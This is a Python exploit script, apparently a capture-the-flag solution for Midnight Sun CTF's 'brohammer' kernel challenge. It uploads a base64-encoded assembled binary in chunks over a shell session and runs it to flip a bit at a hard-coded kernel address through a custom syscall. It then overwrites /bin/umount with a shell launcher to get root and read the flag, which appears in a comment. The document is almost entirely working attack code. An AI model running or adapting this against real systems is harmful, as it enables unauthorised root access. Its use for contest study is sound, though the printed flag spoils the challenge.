#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './run.sh'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        remote  = {'host':'brohammer-01.play.midnightsunctf.se', 'port':1337})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = generate_exploit()

    conn.sendlineafter('$', 'cd') 

    with log.progress('Sending exploit...') as p:
        sent_size = 0
        for s in [exploit[i: i+0x80] for i in range(0, len(exploit), 0x80)]:
            sent_size += len(s)
            conn.sendlineafter('$', 'echo {} >> exploit.b64'.format(s.decode())) 
            p.status('{} bytes'.format(sent_size))

    conn.sendlineafter('$', 'base64 -d exploit.b64 > exploit') 
    conn.sendlineafter('$', 'chmod +x exploit') 
    conn.sendlineafter('$', './exploit') 

    conn.sendlineafter('$', 'rm /bin/umount') 
    conn.sendlineafter('$', 'echo -e "#!/bin/sh\\nsh" > /bin/umount') 
    conn.sendlineafter('$', 'chmod 755 /bin/umount') 

    conn.sendlineafter('$', 'exit') 

    conn.sendlineafter('#', 'cat /root/flag') 

def generate_exploit():
    code = '''
global _start

BITS 64
_start:
        mov rdi, 0xffff880002b5b600
        mov rsi, 0x1
        mov rax, 333
        syscall
        mov rax, 60
        syscall
    '''

    program = tempfile.mktemp()
    source  = program + ".s"
    obj     = program + ".o"
    write(source, code)

    process('nasm {} -f elf64'.format(source).split()).wait_for_close()
    process('ld {} -o {}'.format(obj, program).split()).wait_for_close()
    exploit = base64.b64encode(open(program, 'rb').read())

    os.unlink(program)
    os.unlink(obj)
    os.unlink(source)

    return exploit

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    # midnight{3v3ry7h1ng_15_wr1tabl3_f0r_k3rn3l_br05}
    comn.connection.interactive()
    
#==========
